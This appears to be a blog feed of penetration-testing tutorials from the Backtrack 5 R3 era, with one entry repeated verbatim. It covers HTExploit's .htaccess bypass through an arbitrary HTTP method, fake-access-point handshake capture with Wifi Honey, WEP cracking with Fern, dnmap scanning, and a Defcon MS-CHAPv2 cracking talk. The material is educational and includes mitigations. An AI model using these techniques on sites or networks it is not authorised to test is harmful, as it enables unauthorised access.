&lt;p&gt;HTExploit was released at Blackhat 2012 by Matias KATZ and Maximiliano SOLER. HTExploit (HiperText access Exploit) is a tool that is used to bypass authentication mechanisms which is deployed on websites using .htaccess files. The tool is written in Python. Once the restriction is bypassed, it will be possible to figure out the contents of a directory and even download those files. The tool works in a recursive manner,i.e once it downloads the first chunk of files, it looks for links inside those files and downloads those files as well. This process keeps on going until it has downloaded the entire content of the directory. It then generates an html report informing us about all the files that it has downloaded.&lt;/p&gt;

&lt;p&gt;The tool has 2 modules that can be executed.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Detect- This module only informs the user if the target is vulnerable to the exploit or not.&lt;/li&gt;
  &lt;li&gt;Full - This module runs the attack on the directory using a dictionary that contains a list of the common file names. If those file names are found and if the directory is vulnerable, it is possible to download that file from the server.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In a recent chat session with Maximiliano Soler, one of the 2 people behind this tool, he informed us about how the actual vulnerability is exploited.&lt;/p&gt;

&lt;p&gt;Maximilano Soler:&lt;em&gt;The main problem is that sometimes the restrictions are based in the directive by using “Limit GET POST”.So the problem is that they only put these well known methods for authentication checking. But what happens when we create a different method? for eg. “POTATO”.Apache will proceed with the request and pass this “unknown” method to PHP. PHP says…ok, I will use this method like “GET”. Voila! If you have the exact name of the file, you will be able to download it. This is not a bruteforce attack as we are able to figure out the contents of your directory without knowing your password. There are some ways in which you can protect yourself. Remove the methods from “Limit”. Use Limit with GET and POST, but also with LimitExcept. Alternatively, you can use a module from Apache Mod_AllowMethods. If you are a developer you could also validate the typical variables: $PHP_AUTH_USER, $_SERVER[“REQUEST_METHOD”]. If something else is found that GET or POST, then disallow it.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Here is some sample code used in htaccess files that puts limitations for only GET and POST methods.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTExploit can be found under the directory /pentest/web/htexploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now for a demo of HTExploit, i modified the htaccess settings in one of my websites and was able to successfully run the tool against it. Type the command as shown in the image below to run HTExploit against a targeted website.Once it detect that the target is vulnerable, it will ask you if you want to run a full scan on it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After this, wait for the scan to complete.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the scan is run, it will generate a HTML report reporting the files that it was able to download locally. Here is what a sample report looks like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/5_2.png&quot; alt=&quot;5 2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;wifi-honey&quot;&gt;Wifi Honey&lt;/h2&gt;

&lt;p&gt;Wifi Honey is another great tool that was introduced with Bactrack 5 R3. Basically, in most of the cases it is possible to crack the WEP or WPA encryption key of a network with just a client which is probing for that network. In case of WEP, it is possible by Caffe Latte attack whereas in WPA, it is possible to capture the first 2 packets of the WPA handshake by using just the probing client and that gives us sufficient information in order to crack the WPA key for that network. Using airodump-ng, it is very easy to figure out which network (ESSID) the client is probing for. However, what is not clear by figuring out the ESSID of the probed network is the encryption that network is using. Only by knowing the kind of encryption will we be able to figure out how to crack the encryption. A general technique used to figure this out is by creating four different access points with encryption such as None, WEP, WPA, and WPA 2 using airbase-ng. The probing client will then connect to one of these networks and hence the kind of encryption being used is figured out. At the same time, airodump-ng could also be used to capture the traffic and hence later used to crack WPA. What Wifi Honey does is automate this whole process of creating fake Access points. It create 5 virtual interfaces, 4 of them for creating 4 AP’s with same ESSID but different encryption and another 5th interface for airodump-ng to monitor the traffic on. Hence, at the time the probing client connects to our fake Access point, airodump-ng is being used to capture the traffic.&lt;/p&gt;

&lt;p&gt;Wifi Honey takes 3 parameters, the ESSID of the network that is being probed, the channel no on which you want the AP to listen, and the interface on which you want to create it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we enter this, we will see that it creates 4 networks of the same name with different encryption and also starts airodump-ng at the same time to capture the traffic. Now the probing client will connect to this network and the captured traffic by airodump-ng could be used to crack the encryption key.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;urlcrazy&quot;&gt;UrlCrazy&lt;/h2&gt;

&lt;p&gt;URLCrazy is a tool to determine if a domain name is being abused or not by looking at different examples of domain names caused by typos in the original domain name. For e.g a phishing attack can be carried out very easily by changing just one character in a domain name and then redirecting the user to that domain name, mainly because the user will not be able to recognize the change. What Urlcrazy does is use typos in your domain names to generate new domain names and figure out if those domain names exist or not. If they exist, it fetches out info like A and MX records for that particular domain name.&lt;/p&gt;

&lt;p&gt;Here are the different options available in urlcrazy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s run a urlcrazy query against google.com. As you can see, it found a number of domain names similar to Google.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r2/9.png&quot; alt=&quot;9&quot; /&gt; &lt;img src=&quot;/images/posts/bt5r2/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In some cases, the url found may not be used for malicious purposes. For e.g google.fr is just the French version of Google and so on. However, some other search results look like they were bought mainly to be used in case someone typed that domain name instead of Google by mistake. Overall, this tool could be highly beneficial to large corporations who are looking to protect themselves from phishing attacks and any other form of corporate espionage.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;HTExploit&lt;br /&gt;
&lt;a href=&quot;http://www.mkit.com.ar/labs/htexploit/&quot;&gt;http://www.mkit.com.ar/labs/htexploit/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Wifi Honey - DigiNinja&lt;br /&gt;
&lt;a href=&quot;http://www.digininja.org/projects/wifi_honey.php&quot;&gt;http://www.digininja.org/projects/wifi_honey.php&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;URLCrazy&lt;br /&gt;
&lt;a href=&quot;http://www.morningstarsecurity.com/research/urlcrazy&quot;&gt;http://www.morningstarsecurity.com/research/urlcrazy&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Backtrack 5 R3 Walkthrough part 1</title>
   <link href="https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-1.html"/>
   <updated>2013-06-15T03:00:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-1</id>
   <content type="html">&lt;p&gt;Backtrack is one of the most popular Linux distributions used for Penetration testing and Security Auditing. The Backtrack development team is sponsored by Offensive Security. On 13th August 2012, Backtrack 5 R3 was released. This included the addition of about 60 new tools, most of which were released during the Defcon and Blackhat conference held in Las Vegas in July 2012. In this series of articles, we will look at most of the new tools that were introduced with Backtrack 5 R3 and look at their usage. Some of the notable changes included tools for mobile penetration testing, GUI tools for Wi-fi cracking and a whole new category of tools called Physical Exploitation.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;getting-backtrack-5-r3&quot;&gt;Getting Backtrack 5 R3&lt;/h2&gt;

&lt;p&gt;There are two ways to get up and running quickly with Backtrack 5 R3. If you are already running Backtrack 5 R2, you can upgrade to Backtrack 5 R3 by following the steps described on this &lt;a href=&quot;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&quot;&gt;page&lt;/a&gt;. Or you can do a fresh install of Backtrack 5 R3 from the &lt;a href=&quot;http://www.backtrack-linux.org/downloads/&quot;&gt;downloads&lt;/a&gt; section on Backtrack’s official website.&lt;/p&gt;

&lt;p&gt;A list of the new tools released with Backtrack 5 R3 according to Backtrack’s official website are libcrafter, blueranger, dbd, inundator, intersect, mercury, cutycapt, trixd00r, artemisa, rifiuti2, netgear-telnetenable, jboss-autopwn, deblaze, sakis3g, voiphoney, apache-users, phrasendrescher, kautilya, manglefizz, rainbowcrack, rainbowcrack-mt, lynis-audit, spooftooph, wifihoney, twofi, truecrack, uberharvest, acccheck, statsprocessor, iphoneanalyzer, jad, javasnoop, mitmproxy, ewizard, multimac, netsniff-ng, smbexec, websploit, dnmap, johnny, unix-privesc-check, sslcaudit, dhcpig, intercepter-ng, u3-pwn, binwalk, laudanum, wifite, tnscmd10g bluepot, dotdotpwn, subterfuge, jigsaw, urlcrazy, creddump, android-sdk, apktool, ded, dex2jar, droidbox, smali, termineter, bbqsql, htexploit, smartphone-pentest-framework, fern-wifi-cracker, powersploit, and webhandler. We will be discussing most of these tools in this series.&lt;/p&gt;

&lt;h2 id=&quot;fern-wifi-cracker&quot;&gt;Fern-Wifi-Cracker&lt;/h2&gt;

&lt;p&gt;Fern Wi-fi cracker is a program written in python that provides a GUI for cracking wireless networks. Normally, you need to run aireplay-ng, airodump-ng and aircrack-ng separately in order to crack wireless networks, but Fern-Wifi-cracker makes this job very simple for us by acting as a facade over these tools and hiding all the intricate details from us. It also comes with a bunch of tools that helps you perform attacks like Session Hijacking, locate a particular system’s geolocation based on its Mac address etc.&lt;/p&gt;

&lt;p&gt;Fern Wi-fi cracker can be found under the category Wireless Exploitation tools as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before starting with Fern Wi-fi cracker, it is important to note that you have a Wi-fi card that supports packet injection. In my case, i am running Backtrack 5 R3 as a VM and i have connected an external Alfa Wi-fi card to it. You can verify if your card can be put into monitor mode by just typing airmon-ng and it will show you the list of interfaces that can be put in monitor mode. Once this is done, open up Fern Wi-fi cracker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Select the appropriate interface on which you want to sniff on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have selected it, it will automatically create a virtual interface (mon0) on top of the selected interface (wlan0) as is clear from the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, click on “Scan for access points”. As you can see from the results, it found 4 networks with WEP and 1 network with WPA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, we will be cracking a WEP network named “Infosec test” which i set up for testing purposes. Click on the network “Infosec test” and it will show you its specific information like the BSSID of the access point, the channel on which the Access point is transmitting on etc. On the bottom right, you can select from a variety of attacks like the Arp request replay attack, caffe latte attack etc. In my case, i will be going for an Arp request replay attack. Once this is done, click on “Wi-fi attack” and this will start the whole process of cracking WEP.&lt;/p&gt;

&lt;p&gt;You will now see that some IV’s are being captured as shown in the image below. The tool will also tell you if your card is injecting arp packets properly or not as shown in the bottom right section of the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once enough IV’s have been collected, it will start cracking the WEP key automatically.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/wep.png&quot; alt=&quot;Wep&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, Fern Wi-fi cracker can be used to crack WPA. It just makes the whole process so simple for us. It also provides some extra functionality for hijacking sessions and locating a computer’s geolocation via its Mac address. I recommend you check it out.&lt;/p&gt;

&lt;h2 id=&quot;dnmap&quot;&gt;Dnmap&lt;/h2&gt;

&lt;p&gt;Imagine you have to scan a huge network containing thousands of computers. Scanning via nmap from a single computer will take quite a long time. In order to solve this problem, Dnmap was created. Dnmap is a framework which follows a client/server architecture. The server issues nmap commands to the clients and the clients execute it. In this way, the load of performing such a large scan is distributed among the clients. The commands that the server gives to its clients are put in a command file. The results are stored in a log file which are saved on both the server and the client. The whole process of running Dnmap follows these steps.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create a list of commands that you want to run and store it in a file, say commands.txt. Note the IP address of the server.&lt;/li&gt;
  &lt;li&gt;Run the dnmap server and give the commands file as an argument.&lt;/li&gt;
  &lt;li&gt;Connect the clients to the server. Note that the server should be reachable from the client.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let’s do the demo now. I have 2 virtual machines both running Backtrack 5 R3. I am going to run the Dnmap server on one of the virtual machines and a client on the second one.&lt;/p&gt;

&lt;p&gt;Open dnmap under the category Information Gathering –&amp;gt; Network Analysis –&amp;gt; Identify Live hosts. The next step is to create a commands.txt file. As you can see from the image below, i have 3 commands in the commands.txt file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now type the command as shown in the image below to start the dnmap server. I have started the dnmap server to listen on port 800. As you can see, it currently detects no clients. Hence the next step is to get some clients to connect to this dnmap server. Also, it is better to specify the location of the log file that will be holding all the results.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On my other BT machine, i run the following command to connect the client to the server. Note that the internal IP address of my dnmap server is 10.0.2.15 and since my other virtual machine is also in the same internal network, it is able to reach to the server. You also need to specify the port to which you are connecting to on the server. Also, it is optional to specify an alias for the client.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the client establishes connection with the server, you will see that the client starts executing the commands that it is getting from the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the server side, you will notice that it recognizes this client and shows it in the output. It also keeps giving you regular information like the number of commands executed, uptime, online status etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the scans are completed, dnmap stores the results in a directory named nmap_output. The results are saved in .nmap, .gnmap and xml formats. There are separate output files for each command. It is advisable to clear all the previous files in the nmap_output directory or save them somewhere else before starting a new scan. Here is what a sample response file looks like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at a couple of the most popular tools that were introduced with Backtrack 5 R3. In further articles in this series, we will be discussing about many other new tools that were shipped with Backtrack 5 R3. If there is a particular tool that you want me to write about or if you have any questions, comments, suggestions regarding this series, please write them down in the comments below.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Upgrade from Backtrack 5 R2 to R3&lt;br /&gt;
&lt;a href=&quot;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&quot;&gt;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Fern-Wifi-Cracker&lt;br /&gt;
&lt;a href=&quot;http://code.google.com/p/fern-wifi-cracker/&quot;&gt;http://code.google.com/p/fern-wifi-cracker/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Dnmap framework official page&lt;br /&gt;
&lt;a href=&quot;http://sourceforge.net/projects/dnmap/&quot;&gt;http://sourceforge.net/projects/dnmap/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Backtrack 5 R3 Walkthrough part 1</title>
   <link href="https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-1.html"/>
   <updated>2013-06-15T03:00:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-1</id>
   <content type="html">&lt;p&gt;Backtrack is one of the most popular Linux distributions used for Penetration testing and Security Auditing. The Backtrack development team is sponsored by Offensive Security. On 13th August 2012, Backtrack 5 R3 was released. This included the addition of about 60 new tools, most of which were released during the Defcon and Blackhat conference held in Las Vegas in July 2012. In this series of articles, we will look at most of the new tools that were introduced with Backtrack 5 R3 and look at their usage. Some of the notable changes included tools for mobile penetration testing, GUI tools for Wi-fi cracking and a whole new category of tools called Physical Exploitation.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;getting-backtrack-5-r3&quot;&gt;Getting Backtrack 5 R3&lt;/h2&gt;

&lt;p&gt;There are two ways to get up and running quickly with Backtrack 5 R3. If you are already running Backtrack 5 R2, you can upgrade to Backtrack 5 R3 by following the steps described on this &lt;a href=&quot;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&quot;&gt;page&lt;/a&gt;. Or you can do a fresh install of Backtrack 5 R3 from the &lt;a href=&quot;http://www.backtrack-linux.org/downloads/&quot;&gt;downloads&lt;/a&gt; section on Backtrack’s official website.&lt;/p&gt;

&lt;p&gt;A list of the new tools released with Backtrack 5 R3 according to Backtrack’s official website are libcrafter, blueranger, dbd, inundator, intersect, mercury, cutycapt, trixd00r, artemisa, rifiuti2, netgear-telnetenable, jboss-autopwn, deblaze, sakis3g, voiphoney, apache-users, phrasendrescher, kautilya, manglefizz, rainbowcrack, rainbowcrack-mt, lynis-audit, spooftooph, wifihoney, twofi, truecrack, uberharvest, acccheck, statsprocessor, iphoneanalyzer, jad, javasnoop, mitmproxy, ewizard, multimac, netsniff-ng, smbexec, websploit, dnmap, johnny, unix-privesc-check, sslcaudit, dhcpig, intercepter-ng, u3-pwn, binwalk, laudanum, wifite, tnscmd10g bluepot, dotdotpwn, subterfuge, jigsaw, urlcrazy, creddump, android-sdk, apktool, ded, dex2jar, droidbox, smali, termineter, bbqsql, htexploit, smartphone-pentest-framework, fern-wifi-cracker, powersploit, and webhandler. We will be discussing most of these tools in this series.&lt;/p&gt;

&lt;h2 id=&quot;fern-wifi-cracker&quot;&gt;Fern-Wifi-Cracker&lt;/h2&gt;

&lt;p&gt;Fern Wi-fi cracker is a program written in python that provides a GUI for cracking wireless networks. Normally, you need to run aireplay-ng, airodump-ng and aircrack-ng separately in order to crack wireless networks, but Fern-Wifi-cracker makes this job very simple for us by acting as a facade over these tools and hiding all the intricate details from us. It also comes with a bunch of tools that helps you perform attacks like Session Hijacking, locate a particular system’s geolocation based on its Mac address etc.&lt;/p&gt;

&lt;p&gt;Fern Wi-fi cracker can be found under the category Wireless Exploitation tools as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before starting with Fern Wi-fi cracker, it is important to note that you have a Wi-fi card that supports packet injection. In my case, i am running Backtrack 5 R3 as a VM and i have connected an external Alfa Wi-fi card to it. You can verify if your card can be put into monitor mode by just typing airmon-ng and it will show you the list of interfaces that can be put in monitor mode. Once this is done, open up Fern Wi-fi cracker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Select the appropriate interface on which you want to sniff on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have selected it, it will automatically create a virtual interface (mon0) on top of the selected interface (wlan0) as is clear from the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, click on “Scan for access points”. As you can see from the results, it found 4 networks with WEP and 1 network with WPA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, we will be cracking a WEP network named “Infosec test” which i set up for testing purposes. Click on the network “Infosec test” and it will show you its specific information like the BSSID of the access point, the channel on which the Access point is transmitting on etc. On the bottom right, you can select from a variety of attacks like the Arp request replay attack, caffe latte attack etc. In my case, i will be going for an Arp request replay attack. Once this is done, click on “Wi-fi attack” and this will start the whole process of cracking WEP.&lt;/p&gt;

&lt;p&gt;You will now see that some IV’s are being captured as shown in the image below. The tool will also tell you if your card is injecting arp packets properly or not as shown in the bottom right section of the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once enough IV’s have been collected, it will start cracking the WEP key automatically.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/wep.png&quot; alt=&quot;Wep&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, Fern Wi-fi cracker can be used to crack WPA. It just makes the whole process so simple for us. It also provides some extra functionality for hijacking sessions and locating a computer’s geolocation via its Mac address. I recommend you check it out.&lt;/p&gt;

&lt;h2 id=&quot;dnmap&quot;&gt;Dnmap&lt;/h2&gt;

&lt;p&gt;Imagine you have to scan a huge network containing thousands of computers. Scanning via nmap from a single computer will take quite a long time. In order to solve this problem, Dnmap was created. Dnmap is a framework which follows a client/server architecture. The server issues nmap commands to the clients and the clients execute it. In this way, the load of performing such a large scan is distributed among the clients. The commands that the server gives to its clients are put in a command file. The results are stored in a log file which are saved on both the server and the client. The whole process of running Dnmap follows these steps.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create a list of commands that you want to run and store it in a file, say commands.txt. Note the IP address of the server.&lt;/li&gt;
  &lt;li&gt;Run the dnmap server and give the commands file as an argument.&lt;/li&gt;
  &lt;li&gt;Connect the clients to the server. Note that the server should be reachable from the client.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let’s do the demo now. I have 2 virtual machines both running Backtrack 5 R3. I am going to run the Dnmap server on one of the virtual machines and a client on the second one.&lt;/p&gt;

&lt;p&gt;Open dnmap under the category Information Gathering –&amp;gt; Network Analysis –&amp;gt; Identify Live hosts. The next step is to create a commands.txt file. As you can see from the image below, i have 3 commands in the commands.txt file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now type the command as shown in the image below to start the dnmap server. I have started the dnmap server to listen on port 800. As you can see, it currently detects no clients. Hence the next step is to get some clients to connect to this dnmap server. Also, it is better to specify the location of the log file that will be holding all the results.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On my other BT machine, i run the following command to connect the client to the server. Note that the internal IP address of my dnmap server is 10.0.2.15 and since my other virtual machine is also in the same internal network, it is able to reach to the server. You also need to specify the port to which you are connecting to on the server. Also, it is optional to specify an alias for the client.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the client establishes connection with the server, you will see that the client starts executing the commands that it is getting from the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the server side, you will notice that it recognizes this client and shows it in the output. It also keeps giving you regular information like the number of commands executed, uptime, online status etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the scans are completed, dnmap stores the results in a directory named nmap_output. The results are saved in .nmap, .gnmap and xml formats. There are separate output files for each command. It is advisable to clear all the previous files in the nmap_output directory or save them somewhere else before starting a new scan. Here is what a sample response file looks like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r1/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at a couple of the most popular tools that were introduced with Backtrack 5 R3. In further articles in this series, we will be discussing about many other new tools that were shipped with Backtrack 5 R3. If there is a particular tool that you want me to write about or if you have any questions, comments, suggestions regarding this series, please write them down in the comments below.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Upgrade from Backtrack 5 R2 to R3&lt;br /&gt;
&lt;a href=&quot;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&quot;&gt;http://www.backtrack-linux.org/backtrack/upgrade-from-backtrack-5-r2-to-backtrack-5-r3/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Fern-Wifi-Cracker&lt;br /&gt;
&lt;a href=&quot;http://code.google.com/p/fern-wifi-cracker/&quot;&gt;http://code.google.com/p/fern-wifi-cracker/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Dnmap framework official page&lt;br /&gt;
&lt;a href=&quot;http://sourceforge.net/projects/dnmap/&quot;&gt;http://sourceforge.net/projects/dnmap/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Defcon 20 Day 3 Review</title>
   <link href="https://bitbrain.github.io/2013/06/15/defcon-20-day-3-review.html"/>
   <updated>2013-06-15T02:53:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/defcon-20-day-3-review</id>
   <content type="html">&lt;p&gt;Defcon day 3 started with one of the most awaited talks of Defcon 20. It was the talk “Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2” by Moxie Marlinspike, David Hulton and Marsh Ray. Moxie marlinspike has been one of the most popular speakers at Defcon for the past few years and as expected, the hall was full of people.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1216.JPG&quot; alt=&quot;IMG 1216&quot; /&gt;&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;defeating-pptp-vpns-and-wpa2-enterprise-with-ms-chapv2&quot;&gt;Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2&lt;/h2&gt;

&lt;p&gt;This talk was mainly about pointing out the vulnerabilities in the MS-CHAP v2 protocol. The speaker talks about how the previous research has shown that the security of the protocol is based on the password of the user. PPTP and WPA 2 Enterprise (which is used by the Defcon wi-fi network) both depend on MS-CHAP v2 protocol. He then explains how many of the VPN providers support PPTP, giving a specific example about Ipredator which only supports PPTP. He then gives a quick explaination about the MS-CHAP v2 handshake. He then explains how all the parameters in the handshake except the md4 hash of the password can be found as it is either know or sent in plaintext. Using some advanced mathematical logic, he then explains how the complexity of the password is that of a single DES encrypt, which is 2 to the power of 56. So the only thing to do now is to bruteforce the challenged response. Moxie then passes on the conversation to David hulton who explains how by using a GPA in a machine with a number of cores, it is possible to decrypt the challenged response in less than 24 hours. He then passes on the conversation to Moxie who explains about a new tool called “Chapcrack” that they will be releasing which is capable of parsing packets, get all the information about MS-CHAP v2 handshake, username etc. He then explains how the ability to crack hashes faster is not available to the general public. Finally, he announces the additional feature to crack MS-CHAP v2 responses in his website Cloud Cracker. The user can enter his email address on the website and get the result within 1 day.&lt;/p&gt;

